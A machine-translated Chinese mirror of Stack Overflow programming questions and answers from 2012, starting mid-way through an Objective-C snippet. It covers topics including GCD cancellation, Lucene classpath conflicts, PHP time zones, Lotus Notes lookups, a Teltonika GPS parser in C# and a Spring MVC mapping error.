                    if ([view isKindOfClass:[UIView class]]) {

                        for (id btn in [view subviews]) {
                            if ([btn isKindOfClass:[UIButton class]]) {

                                                   UIButton *imagesBtn = (UIButton *)btn;
                        for (UIActivityIndicatorView *view in [imagesBtn subviews]) {
                            if ([view isKindOfClass:[UIActivityIndicatorView class]]) {
                                if (imagesBtn.tag == seriesCount*100+100+i) {
                                    if (view.tag == seriesCount*100+100+i) {
                                        [imagesBtn setImage:image forState:UIControlStateNormal];
                                        [view stopAnimating];
                                        [view removeFromSuperview];
                                        view = nil;
                                        imagesBtn = nil;
                                    }
                                }
                            }
                        }
                      }
                     }
                   }
                }  

            });

            [image release];
            image = nil;
           [data0 release];
            data0 = nil;
        });

    }
}

} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-23T07:11:10.283

调度队列不支持取消。两个明显的选择：

1.  将您自己的取消标志保留为实例变量，并让块在继续其工作之前检查该标志。所有的块最终都会运行，但是在你设置取消标志之后运行的块会很快返回。

2.  使用 an`NSOperationQueue`而不是调度队列。 [操作队列支持取消](http://developer.apple.com/library/ios/documentation/General/Conceptual/ConcurrencyProgrammingGuide/OperationObjects/OperationObjects.html#//apple_ref/doc/uid/TP40008091-CH101-SW39)。如果您在某个操作开始运行之前取消它，则它根本不会运行。如果操作已经在运行，它不会被中断，但你可以让它检查它的`isCancelled`标志并提前返回。

# eclipse - 无法在 Eclipse Juno 中拖动快速视图

> ID：13524191
> 
> 赞同：0
> 
> 时间：2012-11-23T06:36:44.363
> 
> 标签：eclipse, eclipse-juno

为什么我根本不能拖动它们？当我打开任何视图时，我会确保它是作为快速视图打开的。问题是，它们都停靠在同一个堆栈/栏上，这是不可取的。我想通过拖动它们将相关视图堆叠在一起，但我根本无法拖动它们。

有人面对吗？文档说可以拖动快速视图，但我似乎不能，只是我的任何设置都不允许吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-24T18:05:55.067

似乎他们在朱诺中放弃了快速浏览。但是您可以通过将一组您希望看起来像快速视图的视图构建到多个选项卡中来接近。然后将它们全部最小化，它们的行为主要类似于快速视图。

# java - StandardTokenizer 覆盖最终方法 setReader.(Ljava/io/Reader;)V

> ID：13524192
> 
> 赞同：0
> 
> 时间：2012-11-23T06:36:44.957
> 
> 标签：java, lucene, classloader

我正在尝试使用[Lucene StandardTokenizer](http://lucene.apache.org/core/4_0_0/analyzers-common/org/apache/lucene/analysis/standard/StandardAnalyzer.html)，如下面的代码所示：

```
import org.apache.lucene.analysis.standard.StandardAnalyzer;
import org.apache.lucene.util.Version;

public class App {
    public static void main(String[] args) throws Exception {
        // line 28 goes below
        StandardAnalyzer analyzer = new StandardAnalyzer(Version.LUCENE_40);
        // the rest is irrelevant
    }
} 
```

它正在抛出`VerifyError`：

```
Exception in thread "main" java.lang.VerifyError: class org.apache.lucene.analysis.standard.StandardTokenizer overrides final method setReader.(Ljava/io/Reader;)V
    at java.lang.ClassLoader.defineClass1(Native Method)
    at java.lang.ClassLoader.defineClass(ClassLoader.java:791)
    at java.security.SecureClassLoader.defineClass(SecureClassLoader.java:142)
    at java.net.URLClassLoader.defineClass(URLClassLoader.java:449)
    at java.net.URLClassLoader.access$100(URLClassLoader.java:71)
    at java.net.URLClassLoader$1.run(URLClassLoader.java:361)
    at java.net.URLClassLoader$1.run(URLClassLoader.java:355)
    at java.security.AccessController.doPrivileged(Native Method)
    at java.net.URLClassLoader.findClass(URLClassLoader.java:354)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:423)
    at sun.misc.Launcher$AppClassLoader.loadClass(Launcher.java:308)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:356)
    at lt.App.main(App.java:28) 
```

任何想法如何解决这一问题？非常感谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T08:53:34.217

您的类路径中是否有 2 个不同版本的 lucene？

该方法`setReader(...)`已添加到`StandardTokenizer`4.0.0-BETA 版本中。但它后来在 4.0.0 发布版本之前被删除`StandardTokenizer`并最终进入。`Tokenizer`所以我的类路径中可能有**lucene-analyzers-common** jar的 4.0.0-BETA 版本和**lucene-core** jar 的 4.0.0 发布版本。

[LUCENE-4343](https://issues.apache.org/jira/browse/LUCENE-4343)可能是改变这一点的问题。

# javascript - 如何清除jquery mobile中嵌套列表的填充表单数据？

> ID：13524194
> 
> 赞同：0
> 
> 时间：2012-11-23T06:37:04.963
> 
> 标签：javascript, jquery, jquery-mobile

我正在使用 jquery mobile 和 spring mvc 开发一个移动应用程序。在我的应用程序中，我有嵌套列表，在这个嵌套列表中，我有一些表单。当我填写表格并按下主页或返回按钮时，当我再次打开表格时，表格中的填充数据不会被清除（表格字段包含以前填充的数据）。

如何清除jquery mobile中嵌套列表的填充表单数据？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T07:39:10.693

jQuery mobile 将所有数据加载到同一个页面中，因此单击返回或主页不会重新加载页面；它只是改变了显示的内容。

您需要决定哪些事件应该触发表单被清除并在该事件发生时运行类似的东西

```
$("#myForm").each(function(){this.reset();}); 
```

# php - 如何使用 PHP 查找世界上任何城市的当前时间？

> ID：13524195
> 
> 赞同：5
> 
> 时间：2012-11-23T06:37:05.750
> 
> 标签：php, date, time

例如，我可以像这样键入一个函数：

```
echo findtimeinworld('<some way to format Sydney, Australia>'); // The current time in Sydney, Australia in a timestamp 
```

这样的功能怎么可能？

另外，请注意我在这里使用托管服务器，所以服务器时间可能是任何东西。

对尽可能小的函数进行奖励投票。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-23T06:50:58.473

您将需要一个包含要查询的每个城市的时区信息的数据库，然后对您当前的服务器时间进行时区调整。

[这里](http://www.iana.org/time-zones)有一个时区数据库。看起来它带有一些 C 代码，用于将时区信息转储到一个文件中，希望该文件可以导入到数据库表中。一旦你有了它，你应该能够在一年中的任何时候为世界上任何一个城市调整时区。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-23T06:52:46.307

检查此网络服务，这有助于实现城市时区和当地时间。

[http://www.earthtools.org/webservices.htm#timezone](http://www.earthtools.org/webservices.htm#timezone)

这是它的例子（纽约）。

[http://www.earthtools.org/timezone-1.1/40.71417/-74.00639](http://www.earthtools.org/timezone-1.1/40.71417/-74.00639)

请注意，有一些使用限制：

> 1.  您每秒对这些 Web 服务的请求不得超过一个。
>     
>     
> 2.  如果您认为需要在任何 24 小时内发出另一个相同的请求，则必须缓存结果。
>     
>     
> 3.  您必须在不再需要时删除任何缓存数据，无论如何在 14 天后。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T06:47:35.517

```
date_default_timezone_set('Europe/London');
date_default_timezone_get(); 
```

试试这个。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-23T07:03:31.083

日期和时间函数根据服务器工作，因此您必须在调用任何日期和时间函数之前手动设置时区。并且由于您需要一个根据传递的参数显示时间的函数，因此有效的方法将是根据传递的参数设置时区。为此，您将需要一个数据库，或者可能需要一个时区数组（数组太大，有数百个索引）并相应地匹配它们。

下面是一个简短的伪代码

```
echo findtimeinworld('COUNTRY/CITY'); //findtimeinworld('Australia/Melbourne');

    function findtimeinworld($suppliedTZ){

        //Match $suppliedTZ with timezone database for complete match
        //if match found
        date_default_timezone_set('returned timezone'); 
        //else if match not found
        //match for first part ex Australia and limit the result to 1
        //if match found
        date_default_timezone_set('first returned timezone'); 
        //else if match not found
        date_default_timezone_set('your default timezone');

        //put date and time functions here
    } 
```

# c - C中静态和全局变量的实现

> ID：13524203
> 
> 赞同：-2
> 
> 时间：2012-11-23T06:37:36.580
> 
> 标签：c

C中的静态和全局变量都存储在数据段（未初始化或初始化）中，但静态变量范围只是那个文件或那个函数，全局变量范围是整个程序，两个变量的生命都是整个程序如何实现的。即使它们的行为不同，它们也存储在同一段中。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-23T06:44:40.880

即使两者都在数据段中也存在差异，`static`变量有`internal linkage`和`global`有`external linkage`（默认情况下）这就是为什么静态在当前翻译单元中可见但全局变量在其他翻译单元中可见的原因。

通过将变量声明为静态（在全局范围内），这意味着您仅将变量限制为当前文件。

初始化和未初始化的变量也被存储在两个不同的段中

[这](http://www.geeksforgeeks.org/archives/14268)是程序的每个变量和代码的实际分段。

```
C99 Standard : 6.2.2 Linkages of identifiers 
```

2

在构成整个程序的一组翻译单元和库中，特定标识符的每个声明都`external linkage`表示相同的对象或函数。在`one translation unit`中，标识符的每个声明都`internal linkage`表示相同的对象或函数。标识符的每个声明都`no linkage`表示一个唯一的实体。

3

如果对象或函数的文件范围标识符的声明包含 storageclass 说明符`static`，则标识符具有`internal linkage`.22)

# asp.net - 访问已发布的页面

> ID：13524204
> 
> 赞同：0
> 
> 时间：2012-11-23T06:37:40.523
> 
> 标签：asp.net, asp.net-mvc-3

我有两个项目。其中一个项目是我发布的一个网络应用程序。我想访问这个页面 Upload.aspx

我在不同的解决方案中创建了另一个项目。这个项目是一个 MVC 3.0 应用程序。我的一项操作必须访问页面 Upload.aspx 我如何访问已发布的 url 并调用页面 Upload.aspx 任何建议都会非常有帮助

# lotus-notes - 莲花笔记，搜索等于文本框的数据

> ID：13524206
> 
> 赞同：0
> 
> 时间：2012-11-23T06:37:43.980
> 
> 标签：lotus-notes, lotus-domino, lotusscript, lotus-formula

我不明白为什么不允许我的代码。

```
@If(@DbLookup("":"nocache";@DbName;"GPA";1)="GPnum";@Failure(@Command([FileSave])&@Command([CloseWindow]));@Success)` 
```

请帮我。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-25T07:06:44.060

编辑：我为保存当前文档的按钮操作添加了一个代码（请参见下面的作者评论）
用户输入我们检查的值的可编辑字段称为 GPnum。视图“GPA”按其第一列排序，显示 GPnum 值。

```
t:=@DbLookup("":"nocache";@DbName;"GPA"; GPnum ; 1 ; [FailSilent] );
@If(@IsError(t) ; @Prompt([Ok]; "DB has a problem:";@Text(t)) ;
  t = "" ; @Do(@Command([FileSave]);@Command([CloseWindow])) ;
  @Prompt([Ok] ; "unable to save" ; "The key already exists") ) 
```

原始回应

```
t:=@DbLookup("":"nocache";@DbName;"GPA"; @ThisValue ; 1 );
@If(@IsError(t) ; @Failure("DB has a problem:"+@Text(t)) ; t =  "" ; @Success ; @Failure("The key already exists") ) 
```

如果您使用@failure/@success，您必须在表单中的可编辑字段中（验证）。据我了解，您检查您的价值是否已经存在。所以：

**首先**添加 @thisValue 作为您在 DBLOOKUP 中搜索的键，如上所述 DBLOOKUP 可能会返回错误，因此检查 @isError(t)
**第二次**失败只是阻止表单的验证，我从未尝试过（它没有意义）使其保存表单

希望能帮助到你

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-23T08:05:38.760

```
@If(@DbLookup("":"nocache";@DbName;"GPA";1)="GPnum" 
```

您的代码应该还有 1 个参数。

从帮助

```
@DbLookup( class : cache ; server : database ; view ; key ; fieldName ; keywords ) 
```

因此，您将“GPA”作为视图，然后您需要指定要返回的**键**和**字段/列。**同样对于 DbLookup，我建议您使用 [FAILSILENT] 作为关键字，在这种情况下，您不需要检查 @IsError 的结果

但是，您可能只需要使用@DbColumn 而不是@DbLookup。

据我了解，您需要验证数据库/视图中是否存在某些值，请尝试以下代码：

```
@If(@DbColumn("":"NoCache";@DbName;"GPA";1)="GPnum"; @Failure(@Command([FileSave]) : @Command([CloseWindow])); @Success) 
```

或者

```
@If(@DbLookup("":"NoCache";@DbName;"GPA"; "GPnum"; 1; [FAILSILENT])<>""; @Failure(@Command([FileSave]) : @Command([CloseWindow])); @Success) 
```

# c# - 从 Teltonika FM4200 读取 GPS 数据

> ID：13524210
> 
> 赞同：2
> 
> 时间：2012-11-23T06:37:51.657
> 
> 标签：c#, gps

我已经配置了 GPS 设备并在 C# 中创建了一个侦听器应用程序。我只收到来自设备的 IMEI 号码，而不是任何 GPS NMEA 数据。但是为了检查我何时在 GPS Gate 服务器中检查相同的内容，它会在地图中显示移动。有什么建议么！！！

以下是如何执行数据处理

```
TcpClient client = (TcpClient)tcpClient;
Byte[] bytes = new Byte[10000];
String data = null;
int i;

NetworkStream stream = client.GetStream();

while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
{
    data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
}

Console.WriteLine(data); 
```

当它进入while循环时，它只是等待和睡眠:(

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-16T04:39:25.887

我认为该设备具有类似的模式

Step1：收到IMEI号码后

Step2：重播“01”状态到同一个新作品

代码：

```
TcpClient newClient = (TcpClient)client;

NetworkStream ns = newClient.GetStream()

byte[] bytes = new byte[1024];

bytes = Encoding.ASCII.GetBytes("X");

Console.WriteLine("X");

ns.Write(bytes, 0, bytes.Length); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-02-13T11:02:55.430

1.  首先，当模块连接到服务器时，模块会发送它的 IMEI。IMEI 的发送方式与编码条码相同。
2.  首先是写入的短标识字节数，然后是 IMEI 作为文本（字节）。例如 IMEI 123456789012345 将被发送为 000F313233343536373839303132333435 收到 IMEI 后，
3.  服务器应确定它是否会接受来自该模块的数据。如果是，服务器将回复模块 01，如果不是 00。请注意，确认应以二进制数据包的形式发送。
4.  然后模块开始发送第一个AVL数据包。
5.  服务器接收到数据包并解析后，服务器必须以整数（四个字节）向模块报告接收到的数据数量。如果发送的数据数和服务器上报的不匹配，模块会重新发送发送的数据。

> 参考。FMXXXX 协议 V2.7

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-23T08:58:33.793

我认为你需要做这样的事情（简单的解决方案）。如果你能让它工作，也许你应该检查一些异步套接字/tcp 连接

```
TcpClient client = (TcpClient)tcpClient;
Byte[] bytes = new Byte[10000];
String data = null;
int i;

NetworkStream stream = client.GetStream();

// Will get data as long as data is available after 1st read
do
{
    i = stream.Read(bytes, 0, bytes.Length)
    data = String.Concat(data, System.Text.Encoding.ASCII.GetString(bytes, 0, i));
}
while(stream.DataAvailable); 

// Write the data to console (first time it should be IMEI
Console.WriteLine(data);     

// Write 1 to the stream, note it must probably be byte value 1 -> 0x01
// Flush output stream after writing to prevent buffering

data = "";

// Now try if more data comes in after IMEI and 0x01 reply
do
{
    i = stream.Read(bytes, 0, bytes.Length)
    data = String.Concat(data, System.Text.Encoding.ASCII.GetString(bytes, 0, i));
}
while(stream.DataAvailable);

// Write date to console - move inside the while loop if data keeps coming in
Console.WriteLine(data); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-09-16T09:35:48.487

您必须首先使用以下步骤配置您的跟踪器，如图所示：

要启动配置过程，配置服务器会发送包含服务器主机（IP 地址）的二进制启动 SMS（“Push” SMS），并且 tcp 端口设备应连接并等待 TCP 连接。

收到“推送”短信后，设备尝试使用 GPRS 与配置服务器建立 TCP 连接。如果 TCP 连接尝试成功，服务器通过已建立的连接向设备发送配置数据，设备确认接收配置并自行配置。

如果设备在 TcpWaitTimeout 时间内没有连接到服务器，则服务器停止等待 TCP 连接，使用二进制短信发送配置数据，并等待来自设备的确认短信。如果确认短信没有在指定时间内到达，服务器会认为配置过程失败。 [![在此处输入图像描述](../Images/781e1dc3431678e89fad029df5f9cc3f.png)](https://i.stack.imgur.com/iXeBg.png)

**参考文件：**
[https ://sourceforge.net/p/opengts/discussion/579834/thread/6fd0ffe8/6213/attachment/FMXXXX%20Protocols%20v2.10.pdf](https://sourceforge.net/p/opengts/discussion/579834/thread/6fd0ffe8/6213/attachment/FMXXXX%20Protocols%20v2.10.pdf)

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2015-04-29T13:51:05.870

这是 FM1100 的解析器，它可以帮助您编写 FM4200 模型的代码 [https://github.com/temala/Teltonika-FM1100](https://github.com/temala/Teltonika-FM1100)

```
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Text;
using System.Data;
using System.Net.Sockets;
using System.Linq;
using System.IO;

namespace TeltonikaParser
{
public class Protocol_TeltonikaFMXXXX
{
    private const int CODEC_FMXXX = 0x08;
    private const int ACC = 1;
    private const int DOOR = 2;
    private const int Analog = 4;
    private const int GSM = 5;
    private const int SPEED = 6;
    private const int VOLTAGE = 7;
    private const int GPSPOWER = 8;
    private const int TEMPERATURE = 9;
    private const int ODOMETER = 16;
    private const int STOP = 20;
    private const int TRIP = 28;
    private const int IMMOBILIZER = 29;
    private const int AUTHORIZED = 30;
    private const int GREEDRIVING = 31;
    private const int OVERSPEED = 33;

    private static string Parsebytes(Byte[] byteBuffer, int index, int Size)
    {
        return BitConverter.ToString(byteBuffer, index, Size).Replace("-", string.Empty);
    }

    private static string parseIMEI(Byte[] byteBuffer, int size)
    {
        int index = 0;
        var result = Parsebytes(byteBuffer, index, 2);
        return result;
    }

    private static bool checkIMEI(string data)
    {
        Console.WriteLine(data.Length);
        if (data.Length == 15)
            return true;

        return false;
    }

    private static List<Position> ParsePositions(Byte[] byteBuffer, int linesNB)
    {
        int index = 0;
        index += 7;
        uint dataSize = byteBuffer[index];

        index++;
        uint codecID = byteBuffer[index];

        if (codecID == CODEC_FMXXX)
        {
            index++;
            uint NumberOfData = byteBuffer[index];

            Console.WriteLine("{0} {1} {2} ", codecID, NumberOfData, dataSize);

            List<Position> result = new List<Position>();

            index++;
            for (int i = 0; i < NumberOfData; i++)
            {
                Position position = new Position();

                var timestamp = Int64.Parse(Parsebytes(byteBuffer, index, 8), System.Globalization.NumberStyles.HexNumber);
                index += 8;

                position.Time = DateTime.Now;

                var Preority = byte.Parse(Parsebytes(byteBuffer, index, 1), System.Globalization.NumberStyles.HexNumber);
                index++;

                position.Lo = Int32.Parse(Parsebytes(byteBuffer, index, 4), System.Globalization.NumberStyles.HexNumber) / 10000000.0;
                index += 4;

                position.La = Int32.Parse(Parsebytes(byteBuffer, index, 4), System.Globalization.NumberStyles.HexNumber) / 10000000.0;
                index += 4;

                var Altitude = Int16.Parse(Parsebytes(byteBuffer, index, 2), System.Globalization.NumberStyles.HexNumber);
                index += 2;

                var dir = Int16.Parse(Parsebytes(byteBuffer, index, 2), System.Globalization.NumberStyles.HexNumber);

                if (dir < 90) position.Direction = 1;
                else if (dir == 90) position.Direction = 2;
                else if (dir < 180) position.Direction = 3;
                else if (dir == 180) position.Direction = 4;
                else if (dir < 270) position.Direction = 5;
                else if (dir == 270) position.Direction = 6;
                else if (dir > 270) position.Direction = 7;
                index += 2;

                var Satellite = byte.Parse(Parsebytes(byteBuffer, index, 1), System.Globalization.NumberStyles.HexNumber);
                index++;

                if (Satellite >= 3)
                    position.Status = "A";
                else
                    position.Status = "L";

                position.Speed = Int16.Parse(Parsebytes(byteBuffer, index, 2), System.Globalization.NumberStyles.HexNumber);
                index += 2;

                int ioEvent = byte.Parse(Parsebytes(byteBuffer, index, 1), System.Globalization.NumberStyles.HexNumber);
                index++;
                int ioCount = byte.Parse(Parsebytes(byteBuffer, index, 1), System.Globalization.NumberStyles.HexNumber);
                index++;
                //read 1 byte
                {
                    int cnt = byte.Parse(Parsebytes(byteBuffer, index, 1), System.Globalization.NumberStyles.HexNumber);
                    index++;
                    for (int j = 0; j < cnt; j++)
                    {
                        int id = byte.Parse(Parsebytes(byteBuffer, index, 1), System.Globalization.NumberStyles.HexNumber);
                        index++;
                        //Add output status
                        switch (id)
                        {
                            case ACC:
                                {
                                    var value = byte.Parse(Parsebytes(byteBuffer, index, 1), System.Globalization.NumberStyles.HexNumber);
                                    position.Status += value == 1 ? ",ACC off" : ",ACC on";
                                    index++;
                                    break;
                                }
                            case DOOR:
                                {
                                    var value = byte.Parse(Parsebytes(byteBuffer, index, 1), System.Globalization.NumberStyles.HexNumber);
                                    position.Status += value == 1 ? ",door close" : ",door open";
                                    index++;
                                    break;
                                }
                            case GSM:
                                {
                                    var value = byte.Parse(Parsebytes(byteBuffer, index, 1), System.Globalization.NumberStyles.HexNumber);
                                    position.Status += string.Format(",GSM {0}", value);
                                    index++;
                                    break;
                                }
                            case STOP:
                                {
                                    var value = byte.Parse(Parsebytes(byteBuffer, index, 1), System.Globalization.NumberStyles.HexNumber);
                                    position.StopFlag = value == 1;
                                    position.IsStop = value == 1;

                                    index++;
                                    break;
                                }
                            case IMMOBILIZER:
                                {
                                    var value = byte.Parse(Parsebytes(byteBuffer, index, 1), System.Globalization.NumberStyles.HexNumber);
                                    position.Alarm = value == 0 ? "Activate Anti-carjacking success" : "Emergency release success";
                                    index++;
                                    break;
                                }
                            case GREEDRIVING:
                                {
                                    var value = byte.Parse(Parsebytes(byteBuffer, index, 1), System.Globalization.NumberStyles.HexNumber);
                                    switch (value)
                                    {
                                        case 1:
                                            {
                                                position.Alarm = "Acceleration intense !!";
                                                break;
                                            }
                                        case 2:
                                            {
                                                position.Alarm = "Freinage brusque !!";
                                                break;
                                            }
                                        case 3:
                                            {
                                                position.Alarm = "Virage serré !!";
                                                break;
                                            }
                                        default:
                                            break;
                                    }
                                    index++;
                                    break;
                                }
                            default:
                                {
                                    index++;
                                    break;
                                }
                        }

                    }
                }

                //read 2 byte
                {
                    int cnt = byte.Parse(Parsebytes(byteBuffer, index, 1), System.Globalization.NumberStyles.HexNumber);
                    index++;
                    for (int j = 0; j < cnt; j++)
                    {
                        int id = byte.Parse(Parsebytes(byteBuffer, index, 1), System.Globalization.NumberStyles.HexNumber);
                        index++;

                        switch (id)
                        {
                            case Analog:
                                {
                                    var value = Int16.Parse(Parsebytes(byteBuffer, index, 2), System.Globalization.NumberStyles.HexNumber);
                                    if (value < 12)
                                        position.Alarm += string.Format("Low voltage", value);
                                    index += 2;
                                    break;
                                }
                            case SPEED:
                                {
                                    var value = Int16.Parse(Parsebytes(byteBuffer, index, 2), System.Globalization.NumberStyles.HexNumber);
                                    position.Alarm += string.Format("Speed", value);
                                    index += 2;
                                    break;
                                }
                            default:
                                {
                                    index += 2;
                                    break;
                                }

                        }
                    }
                }

                //read 4 byte
                {
                    int cnt = byte.Parse(Parsebytes(byteBuffer, index, 1), System.Globalization.NumberStyles.HexNumber);
                    index++;
                    for (int j = 0; j < cnt; j++)
                    {
                        int id = byte.Parse(Parsebytes(byteBuffer, index, 1), System.Globalization.NumberStyles.HexNumber);
                        index++;

                        switch (id)
                        {
                            case TEMPERATURE:
                                {
                                    var value = Int32.Parse(Parsebytes(byteBuffer, index, 4), System.Globalization.NumberStyles.HexNumber);
                                    position.Alarm += string.Format("Temperature {0}", value);
                                    index += 4;
                                    break;
                                }
                            case ODOMETER:
                                {
                                    var value = Int32.Parse(Parsebytes(byteBuffer, index, 4), System.Globalization.NumberStyles.HexNumber);
                                    position.Mileage = value;
                                    index += 4;
                                    break;
                                }
                            default:
                                {
                                    index += 4;
                                    break;
                                }

                        }

                    }
                }

                //read 8 byte
                {
                    int cnt = byte.Parse(Parsebytes(byteBuffer, index, 1), System.Globalization.NumberStyles.HexNumber);
                    index++;
                    for (int j = 0; j < cnt; j++)
                    {
                        int id = byte.Parse(Parsebytes(byteBuffer, index, 1), System.Globalization.NumberStyles.HexNumber);
                        index++;

                        var io = Int64.Parse(Parsebytes(byteBuffer, index, 8), System.Globalization.NumberStyles.HexNumber);
                        position.Status += string.Format(",{0} {1}", id, io);
                        index += 8;
                    }
                }

                result.Add(position);
                Console.WriteLine(position.ToString());
            }

            return result;
        }
        return null;
    }

    public static Byte[] DealingWithHeartBeat(string data)
    {

        Byte[] result = { 1 };
        if (checkIMEI(data))
        {
            return result;
        }
        return null;
    }

    public static string ParseHeartBeatData(Byte[] byteBuffer, int size)
    {
        var IMEI = parseIMEI(byteBuffer, size);
        if (checkIMEI(IMEI))
        {
            return IMEI;
        }
        else
        {
            int index = 0;
            index += 7;
            uint dataSize = byteBuffer[index];

            index++;
            uint codecID = byteBuffer[index];

            if (codecID == CODEC_FMXXX)
            {
                index++;
                uint NumberOfData = byteBuffer[index];

                return NumberOfData.ToString();
            }
        }
        return string.Empty;
    }
    public static List<Position> ParseData(Byte[] byteBuffer, int size)
    {

        List<Position> result = new List<Position>();
        result = ParsePositions(byteBuffer, size);
        return result;
    }

    public static Position GetGPRSPos(string oneLine)
    {
        return null;
    }
}
} 
```

# objective-c - 错误 [IRForTarget]：在向 MKMapView 添加叠加层时找不到 Objective-C 间接 ivar 符号

> ID：13524212
> 
> 赞同：1
> 
> 时间：2012-11-23T06:38:01.693
> 
> 标签：objective-c, mkmapview, mkoverlay, ivar

当我尝试将叠加层添加到地图时出现此错误，来自 SO 答案之一[如何防止“_OBJC_IVAR_$_UIPickerView._backgroundView 符号未找到”错误？](https://stackoverflow.com/questions/7217038/how-to-prevent-from-objc-ivar-uipickerview-backgroundview-symbol-not-found)我知道我们不应该使用私有 ivar，但我没有在我的代码中使用它们中的任何一个，但我仍然收到以下错误。

**错误 [IRForTarget]：找不到 Objective-C 间接 ivar 符号 OBJC_IVAR_$_MKPolygon._interiorPolygons**

请告诉我解决这个问题的方法

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-20T09:25:19.557

从 XCode 4.5 开始，3 个变量声明语句可以折叠成 1 个

1.  一个 iVar
2.  属性
3.  综合

现在： 1\. 合成

所以，如果旧代码是：

```
NSString* name; //in .h file
@property (nonatomic, strong) NSString* name; // in .h file
@synthesize name; // in .m file 
```

从 4.5 开始，所需要的只是：

```
@property (nonatomic, strong) NSString* name; // in .h file 
```

我们现在可以使用以下任一方法解决此 iVar：

```
self.name = @"john"; // used to reference the full property setter/getting - usually from outside the object
_name = @"john"; // used to reference an internal variable 
```

当我使用 iVar 时，此错误消息发生在我身上（注意没有前导下划线）：

```
name = @"john"; 
```

要将更改修复为：

```
 self.name = @"john"; // or
    _name = @"john"; 
```

注意：我在 xcode 版本 4.5 (4G182) 上没有收到此错误，但我在 4.5.2 (4G2008a) 上收到此错误。

# eclipse - 警告：在名称为“dispatcher”的 DispatcherServlet 中找不到带有 URI [/projectdemo/WEB-INF/jsp/results.jsp] 的 HTTP 请求的映射

> ID：13524215
> 
> 赞同：1
> 
> 时间：2012-11-23T06:38:38.007
> 
> 标签：eclipse, spring, hibernate, tomcat

我知道这个问题已经重复了很多次，但是我无法解决查看其他线程的问题，我的问题仍然没有解决？

我正在使用 eclipse-Spring 和 Tomcat 服务器

我的 web.xml 为：

```
 <servlet-name>dispatcher</servlet-name>
    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>
    <load-on-startup>1</load-on-startup>
    </servlet>
    <servlet-mapping>
    <servlet-name>dispatcher</servlet-name>
    <url-pattern>*.jsp</url-pattern>
    </servlet-mapping>
    <context-param>
      <param-name>applicationContext</param-name>
      <param-value>applicationContext.xml</param-value>
    </context-param> 
```

我的 dispatcher-servlet.xml 为：

```
 <context:component-scan base-package="com.test.controller"></context:component-scan> 
    <mvc:annotation-driven />
    <bean class="org.springframework.web.servlet.view.InternalResourceViewResolver">
    <property name="prefix" value="/WEB-INF/jsp/"></property>
    <property name="suffix" value=".jsp"></property>
    </bean> </i> 
```

applicationContext.xml 为：

```
 <bean id="dataSourceBean" class="org.springframework.jdbc.datasource.DriverManagerDataSource">
    <property name="driverClassName" value="com.mysql.jdbc.Driver"></property>
    <property name="url" value="jdbc:mysql://localhost/projectdemo"></property>
    <property name="username" value="root"></property>
    <property name="password" value="mysql"></property>        
    </bean> 
    <bean id="sessionFactoryBean" class="org.springframework.orm.hibernate3.LocalSessionFactoryBean">
    <property name="dataSource" ref="dataSourceBean"></property>
    <property name="mappingResources">
        <value>com/test/pojo/User.hbm.xml</value>                   
    </property>
    <property name="hibernateProperties">
          <props>
              <prop key="hibernate.dialect">org.hibernate.dialect.MySQL5Dialect</prop>
              <prop key="hibernate.show_sql">true</prop>
          </props>
     </property>
    </bean>
    <bean id="hibernateTemplateBean" class="org.springframework.orm.hibernate3.HibernateTemplate">
    <property name="sessionFactory" ref="sessionFactoryBean"></property>
</bean>
     <bean id="authenticateServiceBean" class="com.test.service.AuthticateService">
    <property name="hibernateTemplate" ref="hibernateTemplateBean"></property>
    </bean> 
```

我的登录控制器为：

```
 @RequestMapping("/Login.jsp")
    public class LoginController {
    @Autowired 
 private AuthticateService authenticateService;
 //@RequestMapping(value ="WEB-INF/jsp/results.jsp",method = RequestMethod.POST)
 @RequestMapping(method = RequestMethod.POST)
 public ModelAndView processCredentials(@RequestParam("username")String username,@RequestParam("password")String password) {
     System.out.println ("in LoginController");
     String message = "Invalid credentials";
     if(authenticateService.verifyUserNameAndPassword(username, password)) {
         System.out.println ("after IFin LoginController");
         message = "Welcome " + username + "!!";
         System.out.println ("after IFin LoginControllermsg" +message);
     }

     ModelAndView msg = new ModelAndView();
     msg.setViewName("results");
     msg.addObject("message",message);
     System.out.println ("before return" +message);
     return msg;
    //return new ModelAndView("results","message",message);
    }
     } 
```

结果.jsp 文件：

```
 <%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01  Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
    <html>
    <head>
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
    <title>ProjectDemo</title>
    </head>
    <body>
    <h1><%= request.getAttribute("message") %></h1>
    </body>
    </html> 
```

我在控制台中低于味精：

```
 userobject
    User ID : 1, User name : admin, Password : admin123
    after IFin LoginController
    after IFin LoginControllermsgWelcome admin!!
    before returnWelcome admin!!
    Nov 23, 2012 11:19:08 AM org.springframework.web.servlet.DispatcherServlet   noHandlerFound
    WARNING: No mapping found for HTTP request with URI [/projectdemo/WEB- INF/jsp/results.jsp] in DispatcherServlet with name 'dispatcher' 
```

我得到“http://localhost:8080/projectdemo/Login.jsp”

## HTTP 状态 404 -

类型状态报告消息描述请求的资源（）不可用。

